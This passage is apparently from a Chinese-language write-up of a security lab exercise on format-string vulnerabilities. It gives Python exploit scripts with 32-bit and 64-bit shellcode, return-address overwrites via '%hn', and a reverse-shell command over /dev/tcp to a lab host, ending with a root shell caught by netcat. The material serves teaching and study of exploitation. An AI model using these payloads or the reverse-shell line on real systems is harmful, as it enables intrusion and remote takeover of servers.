class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)       <span class="hljs-comment">#0d1364       </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br> <span class="hljs-comment">#        ffff                 db64</span><br><span class="hljs-comment">#0xFFFFD53C+2            0xFFFFD53C</span><br><br>ret_addr=<span class="hljs-number">0xFFFFD53C</span><br><br>ret_addr_low=ret_addr     <span class="hljs-comment"># DA90</span><br>ret_addr_high=ret_addr+<span class="hljs-number">2</span>  <span class="hljs-comment"># FFFF</span><br><br><span class="hljs-comment">#change retaddr into 0xffffd610+0d1364=0xffff DA90</span><br><br><span class="hljs-comment"># new_ret=ret_addr+1364</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]=(ret_addr_low).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]=(<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&quot;latin-1&quot;</span>)<br><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]=(ret_addr_high).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-comment">#0xDA90-12-8*62=55952-508=55444</span><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.55444x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.9583x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">�KP�CT�KH1�1��5 | �KL�K<br>              �����/bin/bash*-c*/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *AAAABBBBCCCCDDDDThe target variable&#x27;s value (after):  0x11223344<br>server-10.9.0.5 | total 832<br>server-10.9.0.5 | -rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 319488 </span>Mar<span class="hljs-number"> 29 </span>13:23 core<br>server-10.9.0.5 | -rwxrwxr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 709340 </span>Mar<span class="hljs-number"> 27 </span>07:43 format<br>server-10.9.0.5 | -rwxrwxr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 17880 </span>Mar<span class="hljs-number"> 27 </span>07:43 server<br>server-10.9.0.5 | ===== Success! ======<br><br></code></pre></td></tr></table></figure>
+
+<p>根据回显可以确定触发了/bin/ls命令</p>
+<h2 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell"></a>Getting a Reverse Shell</h2><p> We are not interested in running some pre-determined commands. We want<br>to get a root shell on the target server, so we can type any command we want. Since we are on a remote<br>machine, if we simply get the server to run /bin/bash, we won’t be able to control the shell program.<br>Reverse shell is a typical technique to solve this problem. Section 9 provides detailed instructions on how<br>to run a reverse shell. Please modify the command string in your shellcode, so you can get a reverse shell<br>on the target server. Please include screenshots and explanation in your lab report.</p>
+<p>供给端ip为inet 10.9.0.1</p>
+<p>攻击端运行<code>nc -l 9090 -nv</code>等待reverse shell</p>
+<p>更改py脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br> <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>    <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <br> <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)       <span class="hljs-comment">#0d1364       </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br> <span class="hljs-comment">#        ffff                 db64</span><br><span class="hljs-comment">#0xFFFFD53C+2            0xFFFFD53C</span><br><br>ret_addr=<span class="hljs-number">0xFFFFD53C</span><br><br>ret_addr_low=ret_addr     <span class="hljs-comment"># DA90</span><br>ret_addr_high=ret_addr+<span class="hljs-number">2</span>  <span class="hljs-comment"># FFFF</span><br><br><span class="hljs-comment">#change retaddr into 0xffffd610+0d1364=0xffff DA90</span><br><br><span class="hljs-comment"># new_ret=ret_addr+1364</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]=(ret_addr_low).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]=(<span class="hljs-string">&quot;AAAA&quot;</span>).encode(<span class="hljs-string">&quot;latin-1&quot;</span>)<br><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]=(ret_addr_high).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-comment">#0xDA90-12-8*62=55952-508=55444</span><br>data = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.55444x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.9583x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>data = (data).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(data)] = data<br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">5</span> <span class="hljs-number">58502</span><br>root<span class="hljs-variable">@d21da27aa2b7</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h1><ul>
+<li><p><strong>The input buffer’s address: 0x00007fffffffe540</strong></p>
+</li>
+<li><p><strong>Frame Pointer (inside myprintf): 0x00007fffffffe480</strong></p>
+</li>
+</ul>
+<p>输入：</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">echo AAAA-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>-<span class="hljs-built_in">%x</span>- | nc <span class="hljs-number">10.9</span><span class="hljs-number">.0</span><span class="hljs-number">.6</span> <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure>
+
+<p>回显：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span>-<span class="hljs-number">555592</span>a<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">39</span>-<span class="hljs-number">90</span>-ffffe<span class="hljs-number">540</span>-<span class="hljs-number">0</span>-ffffe<span class="hljs-number">480</span>-ffffe<span class="hljs-number">510</span>-<span class="hljs-number">55555383</span>-<span class="hljs-number">5</span>dc-ffffe<span class="hljs-number">540</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>c<span class="hljs-number">09500</span>-ffffeb<span class="hljs-number">30</span>-<span class="hljs-number">5555531</span>b-ffffec<span class="hljs-number">28</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure>
+
+<p>保存到tmp中，grep一下，发现偏移为34</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">~$ grep -o &#x27;-&#x27; tmp | wc - l<br>    <span class="hljs-number"> 34 </span>    <span class="hljs-number"> 34 </span>    <span class="hljs-number"> 68 </span>-<br></code></pre></td></tr></table></figure>
+
+<p>printf遇到0会终止输出，由于64位的地址都会有0，所以地址应该放在字符串的后面</p>
+<p>找到shellcode的地址，并格式化输出：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">shellcode_addr</span>=start+buf<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%shellcode_addr) <br></code></pre></td></tr></table></figure>
+
+<p><strong>shellcode_addr：0x7fffffffea77</strong></p>
+<p>使用%hn每次更改两字节，我们需要以下三个地址</p>
+ <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># print(&#x27;%#x&#x27;%shellcode_addr) 0x 0000 7fff ffff ea77</span><br><span class="hljs-attr">s_0_16</span>=<span class="hljs-number">0</span>xea77<br><span class="hljs-attr">s_16_32</span>=<span class="hljs-number">0</span>xffff<br><span class="hljs-attr">s_32_48</span>=<span class="hljs-number">0</span>x7fff<br></code></pre></td></tr></table></figure>
+
+<p>根据大小顺序构造格式化字符串：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># order : s_32_48  s_0_16  s_16_32</span><br><br><span class="hljs-attribute">fmt</span>=&#x27;%.&#x27;+str(s_<span class="hljs-number">32</span>_<span class="hljs-number">48</span>)+&#x27;x%<span class="hljs-number">11</span>$hn&#x27;<br><span class="hljs-attribute">fmt</span>+=&#x27;%.&#x27; + str(s_<span class="hljs-number">0</span>_<span class="hljs-number">16</span>-s_<span class="hljs-number">32</span>_<span class="hljs-number">48</span>) + &#x27;x%<span class="hljs-number">12</span>$hn&#x27;<br><span class="hljs-attribute">fmt</span>+=&#x27;%.&#x27; + str(s_<span class="hljs-number">16</span>_<span class="hljs-number">32</span>-s_<span class="hljs-number">0</span>_<span class="hljs-number">16</span>) + &#x27;x%<span class="hljs-number">13</span>$hn&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>得到fmt字符串的大小为41</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(len(fmt)</span></span>) <span class="hljs-number">41</span><br></code></pre></td></tr></table></figure>
+
+<p>目标地址</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ret1</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">488</span> # ret_myprint<br><span class="hljs-attribute">ret2</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">48</span>a # ret_myprint + <span class="hljs-number">2</span> <br><span class="hljs-attribute">ret3</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">48</span>c # ret_myprint + <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+
+<p>计算偏移</p>
+<p>从前面可知，到buffer的偏移为34，由于fmt字符串有41个字节，因此要从8的整数倍开始填充地址，也即是第48个字节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230330223149351.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># from 6th </span><br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">48</span>:<span class="hljs-number">56</span>] = (s<span class="hljs-number">3</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">56</span>:<span class="hljs-number">64</span>] = (s<span class="hljs-number">1</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (s<span class="hljs-number">2</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>运行攻击脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br> <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>    <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <br> <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_64<br><br>buf=<span class="hljs-number">0x00007fffffffe540</span><br>rbp=<span class="hljs-number">0x00007fffffffe480</span><br>ret_myprint=rbp+<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%ret_myprint)<br><span class="hljs-comment"># Put the shellcode somewhere in the payload 0x 7fff ffff e488</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)            <br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br>shellcode_addr=start+buf<br><span class="hljs-comment"># print(&#x27;%#x&#x27;%shellcode_addr) 0x 0000 7fff ffff ea77</span><br>s_0_16=<span class="hljs-number">0xea77</span><br>s_16_32=<span class="hljs-number">0xffff</span><br>s_32_48=<span class="hljs-number">0x7fff</span><br><br><span class="hljs-comment"># order : s_32_48  s_0_16  s_16_32</span><br><br>fmt =<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_32_48)+<span class="hljs-string">&#x27;x%40$hn&#x27;</span><br>fmt+=<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_0_16-s_32_48) + <span class="hljs-string">&#x27;x%41$hn&#x27;</span><br>fmt+=<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_16_32-s_0_16) + <span class="hljs-string">&#x27;x%42$hn&#x27;</span><br><br><span class="hljs-comment"># print(len(fmt)) 41</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(fmt)]=fmt.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>ret1=<span class="hljs-number">0x7fffffffe488</span><br>ret2=<span class="hljs-number">0x7fffffffe48a</span><br>ret3=<span class="hljs-number">0x7fffffffe48c</span><br><br><span class="hljs-comment"># from 6th </span><br>content[<span class="hljs-number">48</span>:<span class="hljs-number">56</span>] = (ret3).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">56</span>:<span class="hljs-number">64</span>] = (ret1).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (ret2).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(content)<br><br></code></pre></td></tr></table></figure>
+
